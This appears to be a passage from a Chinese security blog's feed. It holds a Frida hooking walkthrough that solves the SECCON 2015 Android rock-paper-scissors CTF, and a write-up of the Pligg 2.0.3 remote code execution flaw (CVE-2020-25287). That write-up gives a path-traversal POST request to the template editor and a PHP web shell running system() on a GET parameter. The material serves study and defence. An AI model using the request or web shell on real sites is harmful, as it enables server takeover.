class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def _get_device(predicate, timeout):</span><br><span class="line">    mgr &#x3D; get_device_manager()                &#x2F;&#x2F;获取设备管理</span><br><span class="line">    def find_matching_device():               &#x2F;&#x2F;寻找匹配设备</span><br><span class="line">        usb_devices &#x3D; [device for device in mgr.enumerate_devices() if predicate(device)]</span><br><span class="line">        if len(usb_devices) &gt; 0:</span><br><span class="line">            return usb_devices[0]</span><br><span class="line">        else:</span><br><span class="line">            return None</span><br><span class="line">    device &#x3D; find_matching_device()</span><br><span class="line">   ...省略</span><br></pre></td></tr></table></figure><p>get_device_manager()代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def get_device_manager():</span><br><span class="line">    global _device_manager</span><br><span class="line">    if _device_manager is None:</span><br><span class="line">        from . import core</span><br><span class="line">        _device_manager &#x3D; core.DeviceManager(_frida.DeviceManager())</span><br><span class="line">    return _device_manager</span><br></pre></td></tr></table></figure><p>DeviceManager中enumerate_devices(）方法，可以看到enumerate_devices()方法实际上是返回了一个Device()类的实例化对象List。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">class DeviceManager(object):</span><br><span class="line">    def __init__(self, impl):</span><br><span class="line">        self._impl &#x3D; impl</span><br><span class="line"> </span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return repr(self._impl)</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;返回了一个Device()类的实例化。</span><br><span class="line">    def enumerate_devices(self):</span><br><span class="line">        return [Device(device) for device in self._impl.enumerate_devices()]</span><br><span class="line"> </span><br><span class="line">    def add_remote_device(self, host):</span><br><span class="line">        return Device(self._impl.add_remote_device(host))</span><br><span class="line"> </span><br><span class="line">    def remove_remote_device(self, host):</span><br><span class="line">        self._impl.remove_remote_device(host)</span><br><span class="line"> </span><br><span class="line">    def get_device(self, device_id):</span><br><span class="line">        devices &#x3D; self._impl.enumerate_devices()</span><br><span class="line">        if device_id is None:</span><br><span class="line">            return Device(devices[0])</span><br><span class="line">        for device in devices:</span><br><span class="line">            if device.id &#x3D;&#x3D; device_id:</span><br><span class="line">                return Device(device)</span><br><span class="line">        raise _frida.InvalidArgumentError(&quot;unable to find device with id %s&quot; % device_id)</span><br><span class="line"> </span><br><span class="line">    def on(self, signal, callback):</span><br><span class="line">        self._impl.on(signal, callback)</span><br><span class="line"> </span><br><span class="line">    def off(self, signal, callback):</span><br><span class="line">        self._impl.off(signal, callback)</span><br></pre></td></tr></table></figure><p>继续跟进Device类中的，就找到了attach()方法。在attach方法这是设置断点，看看传入的数据。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923213529047.png" alt="image-20200923213529047"></p><p>接下来提供的“应用完整名”是通过self._pid_of()函数去找到对应的进程号pid，然后将pid后通过Session类初始化。到此第一句代码过程就算是明白了，最终得到的是一个对应进程号pid的Session实例化对象process。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">class Device(object):</span><br><span class="line">    def __init__(self, device):</span><br><span class="line">        self.id &#x3D; device.id</span><br><span class="line">        self.name &#x3D; device.name</span><br><span class="line">        self.icon &#x3D; device.icon</span><br><span class="line">        self.type &#x3D; device.type</span><br><span class="line">        self._impl &#x3D; device</span><br><span class="line"> </span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return repr(self._impl)</span><br><span class="line"> </span><br><span class="line">    ...节省空间删除部分方法，详细内容可自行查看源码</span><br><span class="line"> </span><br><span class="line">    def kill(self, target):</span><br><span class="line">        self._impl.kill(self._pid_of(target))</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;返回了一个Session的实例化对象</span><br><span class="line">    def attach(self, target):</span><br><span class="line">        return Session(self._impl.attach(self._pid_of(target)))</span><br><span class="line"> </span><br><span class="line">    def inject_library_file(self, target, path, entrypoint, data):</span><br><span class="line">        return self._impl.inject_library_file(self._pid_of(target), path, entrypoint, data)</span><br><span class="line"> </span><br><span class="line">    def inject_library_blob(self, target, blob, entrypoint, data):</span><br><span class="line">        return self._impl.inject_library_blob(self._pid_of(target), blob, entrypoint, data)</span><br><span class="line"> </span><br><span class="line">    def on(self, signal, callback):</span><br><span class="line">        self._impl.on(signal, callback)</span><br><span class="line"> </span><br><span class="line">    def off(self, signal, callback):</span><br><span class="line">        self._impl.off(signal, callback)</span><br><span class="line"> </span><br><span class="line">    def _pid_of(self, target):</span><br><span class="line">        if isinstance(target, numbers.Number):</span><br><span class="line">            return target</span><br><span class="line">        else:</span><br><span class="line">            return self.get_process(target).pid</span><br></pre></td></tr></table></figure><p>第二句，紧接着process.create_script(jscode)，可以看到它返回一个Script类的实例化，参数不确定。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def create_script(self, *args, **kwargs):</span><br><span class="line">        return Script(self._impl.create_script(*args, **kwargs))</span><br></pre></td></tr></table></figure><p>跟进Script类，可以找到on()方法，在on方法中可以设置自定义回调函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">class Script(object):</span><br><span class="line">    def __init__(self, impl):</span><br><span class="line">        self.exports &#x3D; ScriptExports(self)</span><br><span class="line"> </span><br><span class="line">        self._impl &#x3D; impl</span><br><span class="line">        self._on_message_callbacks &#x3D; []</span><br><span class="line">        self._log_handler &#x3D; self._on_log</span><br><span class="line"> </span><br><span class="line">        self._pending &#x3D; &#123;&#125;</span><br><span class="line">        self._next_request_id &#x3D; 1</span><br><span class="line">        self._cond &#x3D; threading.Condition()</span><br><span class="line"> </span><br><span class="line">        impl.on(&#39;destroyed&#39;, self._on_destroyed)</span><br><span class="line">        impl.on(&#39;message&#39;, self._on_message)</span><br><span class="line"> </span><br><span class="line">   ...节省空间删除部分类方法，详细内容可自行查看源码</span><br><span class="line"> </span><br><span class="line">    def load(self):</span><br><span class="line">        self._impl.load()</span><br><span class="line"> </span><br><span class="line">   &#x2F;&#x2F;设置自定义回调函数</span><br><span class="line">    def on(self, signal, callback):</span><br><span class="line">        if signal &#x3D;&#x3D; &#39;message&#39;:</span><br><span class="line">            self._on_message_callbacks.append(callback)</span><br><span class="line">        else:</span><br><span class="line">            self._impl.on(signal, callback)</span><br><span class="line"> </span><br><span class="line">在IDE中可以看到_on_message_callbacks中存放的on_message函数地址。</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924155129213.png" alt="image-20200924155129213"><br>接下来调用load()方法，在服务端就启动javascript脚本了，至于在frida-server服务端怎么执行的，可逆向研究一下frida-server，它才是真正的核心。</p><h2 id="0x05-Javascript代码构造与执行"><a href="#0x05-Javascript代码构造与执行" class="headerlink" title="0x05 Javascript代码构造与执行"></a>0x05 Javascript代码构造与执行</h2><h3 id="方法一：获取calc-返回值"><a href="#方法一：获取calc-返回值" class="headerlink" title="方法一：获取calc()返回值"></a>方法一：获取calc()返回值</h3><p>第一种思路就是直接获取calc的返回值，从native函数定义上知道它的返回值是int类型，当然直接获取calc函数的返回值是解出问题最简单的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public native int calc();</span><br></pre></td></tr></table></figure><p>那怎么获取calc()函数的返回值呢，这个函数在MainActivity类中，直接引用该类下的calc()方法，不就ok了吗，原理是这样，下面就来构造一下Javascript代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Java.Perform 开始执行JavaScript脚本。</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">&#x2F;&#x2F;定义变量MainActivity，Java.use指定要使用的类</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    &#x2F;&#x2F;hook该类下的onCreate方法，重新实现它</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function () &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        &#x2F;&#x2F;调用calc()方法，获取返回值</span><br><span class="line">        var returnValue &#x3D; this.calc();</span><br><span class="line">        send(&quot;Return:&quot;+returnValue);</span><br><span class="line">        var result &#x3D; (1000+returnValue)*107;</span><br><span class="line">        &#x2F;&#x2F;解出答案</span><br><span class="line">        send(&quot;Flag:&quot;+&quot;SECCON&#123;&quot;+result.toString()+&quot;&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>JavaScript代码就是这样，如果不是很理解，学习一下JavaScript基础即可，下面看看完整的python脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8-*-</span><br><span class="line">import frida, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jscode &#x3D; &quot;&quot;&quot;</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function () &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        var returnValue &#x3D; this.calc();</span><br><span class="line">        send(&quot;Return:&quot;+returnValue);</span><br><span class="line">        var result &#x3D; (1000+returnValue)*107;</span><br><span class="line">        send(&quot;Flag:&quot;+&quot;SECCON&#123;&quot;+result.toString()+&quot;&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;com.example.seccon2015.rock_paper_scissors&#39;)</span><br><span class="line">script &#x3D; process.create_script(jscode)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>不知道为什么hook的为应用的onCreate方法始终不行所以hook对应的onClick方法进行结果如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924110841383.png" alt="image-20200924110841383"></p><h3 id="方法二：修改cnt的值为1000"><a href="#方法二：修改cnt的值为1000" class="headerlink" title="方法二：修改cnt的值为1000"></a>方法二：修改cnt的值为1000</h3><p>第二种思路也比较简单，我们需要修改cnt的值，但如果直接修改cnt的初始值为1000的话，在游戏中可能存在不确定因素，比如输了会置0，赢了cnt值就变成1001了，所以还得控制一下输赢，而输赢的条件是电脑出什么，所以最终hook的方法就在onClick中。<br>从onClick()中可以知道，控制输赢的在于修改this.n 和 this.m的值，再来看看源代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">private final Runnable showMessageTask &#x3D; new Runnable() &#123;</span><br><span class="line">        public void run() &#123;</span><br><span class="line">            TextView tv3 &#x3D; (TextView) MainActivity.this.findViewById(R.id.textView3);</span><br><span class="line">            MainActivity mainActivity;</span><br><span class="line">            &#x2F;&#x2F;我方:布 CPU：石头 or 我方：石头 CUP：剪刀 ，则为赢</span><br><span class="line">            if (MainActivity.this.n - MainActivity.this.m &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                mainActivity &#x3D; MainActivity.this;</span><br><span class="line">                mainActivity.cnt++;</span><br><span class="line">                tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">             &#x2F;&#x2F;反过来当然是输咯</span><br><span class="line">            &#125; else if (MainActivity.this.m - MainActivity.this.n &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">                tv3.setText(&quot;LOSE +0&quot;);</span><br><span class="line">             &#x2F;&#x2F;一样则打平</span><br><span class="line">            &#125; else if (MainActivity.this.m &#x3D;&#x3D; MainActivity.this.n) &#123;</span><br><span class="line">                tv3.setText(&quot;DRAW +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">             &#x2F;&#x2F;我布  cup:剪刀</span><br><span class="line">            &#125; else if (MainActivity.this.m &lt; MainActivity.this.n) &#123;</span><br><span class="line">                MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">                tv3.setText(&quot;LOSE +0&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                mainActivity &#x3D; MainActivity.this;</span><br><span class="line">                mainActivity.cnt++;</span><br><span class="line">                tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F;获胜1000次则能够获取flag</span><br><span class="line">            if (1000 &#x3D;&#x3D; MainActivity.this.cnt) &#123;</span><br><span class="line">                tv3.setText(&quot;SECCON&#123;&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;&#125;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.this.flag &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>JavaScript代码编写如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function () &#123;</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    &#x2F;&#x2F;hook onClick方法，此处要注意的是onClick方法是传递了一个View参数v</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function (v) &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        &#x2F;&#x2F;调用onClick,模拟点击事件</span><br><span class="line">        this.onClick(v);</span><br><span class="line">        &#x2F;&#x2F;修改参数  满足第一个if 或者 最后一个else即可</span><br><span class="line">        this.n.value &#x3D; 0;</span><br><span class="line">        this.m.value &#x3D; 2;</span><br><span class="line">        this.cnt.value &#x3D; 999;</span><br><span class="line">        send(&quot;Success!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>完整python代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import frida, sys</span><br><span class="line"> </span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"> </span><br><span class="line">jscode &#x3D; &quot;&quot;&quot;</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function (v) &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        this.onClick(v);</span><br><span class="line">        this.n.value &#x3D; 0;</span><br><span class="line">        this.m.value &#x3D; 2;</span><br><span class="line">        this.cnt.value &#x3D; 999;</span><br><span class="line">        send(&quot;Success!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;com.example.seccon2015.rock_paper_scissors&#39;)</span><br><span class="line">script &#x3D; process.create_script(jscode)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>执行python脚本，任意点击按钮，答案就出来了。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924112142535.png" alt="image-20200924112142535"></p><h3 id="方法三：分析calc-方法算出答案"><a href="#方法三：分析calc-方法算出答案" class="headerlink" title="方法三：分析calc()方法算出答案"></a>方法三：分析calc()方法算出答案</h3><p>calc() 这个方法在so中，对应的分析汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">static &#123;</span><br><span class="line">  System.loadLibrary(&quot;calc&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public native int calc();</span><br></pre></td></tr></table></figure><p>直接使用ida pro或者radare2分析汇编代码也是可以的。这里给出用radare2反汇编出来的代码。可以看到，calc()函数就单纯的返回了int值7</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924113024992.png" alt="image-20200924113024992"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924114127105.png" alt="image-20200924114127105"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p><strong>一般分析流程</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.反编译apk，分析代码寻找hook点。</span><br><span class="line">2.编写js代码，调用类的方法或者替换。</span><br><span class="line">3.在python中执行即可。</span><br></pre></td></tr></table></figure><h5 id="更新中…"><a href="#更新中…" class="headerlink" title="更新中…."></a>更新中….</h5>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h2&gt;&lt;p&gt;Frida是个轻量级别的hook框架&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;是Python API，但Jav
      
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="Frida" scheme="http://www.ol4three.com/tags/Frida/"/>
    
      <category term="Hook" scheme="http://www.ol4three.com/tags/Hook/"/>
    
  </entry>
  
  <entry>
    <title>Pligg远程命令执行(CVE-2020-25287)</title>
    <link href="http://www.ol4three.com/2020/09/17/WEB/Exploit/Pligg%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2020-25287/"/>
    <id>http://www.ol4three.com/2020/09/17/WEB/Exploit/Pligg%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2020-25287/</id>
    <published>2020-09-17T09:39:41.000Z</published>
    <updated>2020-12-01T12:15:42.101Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>the_file</code>由于无需检查扩展名，我们可以通过模板编辑器菜单使用参数来访问任何文件，然后将webshell创建到现有的php文件中</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Pligg2.0.3版本</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174643966.png" alt="image-20200917174643966"></p><p>转到<code>/admin/admin_editor.php</code>拦截请求并将路径更改为文件。</p><p>例如得到<code>index.php</code>申请：<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174701957.png" alt="image-20200917174701957"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;admin&#x2F;admin_editor.php HTTP&#x2F;1.1</span><br><span class="line">Host: kliqqi</span><br><span class="line">Content-Length: 33</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;kliqqi</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.102 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;kliqqi&#x2F;admin&#x2F;admin_editor.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: fr-FR,fr;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7</span><br><span class="line">Cookie: panelState&#x3D;CollapseManage%7CCollapseSettings%7CCollapseTemplate; PHPSESSID&#x3D;lfkc3gtrv5o1golmt5md3; mnm_user&#x3D;Admin; mnm_key&#x3D;QWRtaW46MjI0R2dEVTAxZncxZzpl</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">the_file&#x3D;..%2Findex.php&amp;open&#x3D;Open</span><br></pre></td></tr></table></figure><p>模版编辑器功能可以编辑任意文件内容,在文件中加入恶意代码导致代码执行。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174734515.png" alt="image-20200917174734515"></p><p>比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  if($_GET[&#39;cmd&#39;])&#123;</span><br><span class="line">    system($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问<code>website.fr?cmd=dir</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174826813.png" alt="image-20200917174826813"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;&lt;code&gt;the_file&lt;/code&gt;由于无需检查扩展名，我们可以通过模板编辑器菜单使用参数来访问任何文件，然后将web
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Pligg" scheme="http://www.ol4three.com/tags/Pligg/"/>
    
  </entry>
  
  <entry>
    <title>Apache DolphinScheduler远程代码执行(CVE-2020-11974)</title>
    <link href="http://www.ol4three.com/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2020-11974/"/>
    <id>http://www.ol4three.com/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2020-11974/</id>
    <published>2020-09-17T09:02:36.000Z</published>
    <updated>2020-12-01T12:14:47.689Z</updated>
    
